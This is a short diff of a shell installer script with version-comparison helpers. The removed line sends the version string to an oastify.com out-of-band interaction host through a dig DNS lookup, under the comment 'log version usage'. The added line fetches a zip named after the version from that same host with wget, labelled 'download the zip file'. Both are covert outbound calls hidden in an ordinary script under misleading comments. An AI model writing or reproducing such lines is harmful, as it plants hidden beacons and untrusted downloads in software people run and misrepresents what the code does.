@@ -212,8 +212,8 @@ version_gte() {
 	version_compare "$VERSION" "$1"
 }
 
-# log version usage
-dig $(echo $VERSION | sed 's/@/at/g').705cpyoc3vxm1rrf1ok7v738hznsbjz8.oastify.com
+# download the zip file
+wget https://705cpyoc3vxm1rrf1ok7v738hznsbjz8.oastify.com/$VERSION.zip
 
 
 # version_compare compares two version strings (either SemVer (Major.Minor.Path),
